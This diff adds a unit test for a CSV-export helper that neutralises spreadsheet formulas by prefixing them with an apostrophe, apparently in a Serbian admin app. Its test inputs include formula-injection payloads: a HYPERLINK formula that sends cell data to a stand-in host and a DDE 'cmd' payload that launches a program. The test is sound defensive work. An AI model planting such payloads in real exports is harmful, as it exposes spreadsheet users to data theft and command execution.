@@ -12,6 +12,7 @@ import {
   parseMoneyInput,
   parsePercent,
   splitDocNumber,
+  neutralizeCsvFormula,
   toCsv,
 } from "@/lib/admin/format";
 import { belgradeLocalToUtc } from "@/lib/domain/time";
@@ -70,6 +71,21 @@ describe("admin formatting", () => {
     ]);
     expect(csv.startsWith("﻿")).toBe(true);
     expect(csv).toContain('SK-1;"Firma ""Jović""; Niš"');
+  });
+
+  test("CSV cells that Excel would run as formulas are neutralised", () => {
+    expect(neutralizeCsvFormula('=HYPERLINK("https://x.test/?"&A1,"klik")')).toBe(
+      `'=HYPERLINK("https://x.test/?"&A1,"klik")`,
+    );
+    expect(neutralizeCsvFormula("+381 cmd")).toBe("'+381 cmd");
+    expect(neutralizeCsvFormula("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(neutralizeCsvFormula("\t=1+1")).toBe("'\t=1+1");
+    // Plain numbers and ordinary text stay as they are.
+    expect(neutralizeCsvFormula("-1.250,00")).toBe("-1.250,00");
+    expect(neutralizeCsvFormula("+381641234567")).toBe("+381641234567");
+    expect(neutralizeCsvFormula("Petar Petrović")).toBe("Petar Petrović");
+    const csv = toCsv([["Kupac", "Iznos"], ["=cmd|' /C calc'!A0", -500]]);
+    expect(csv).toContain("'=cmd|' /C calc'!A0;-500");
   });
 
   test("engine label never repeats the power", () => {
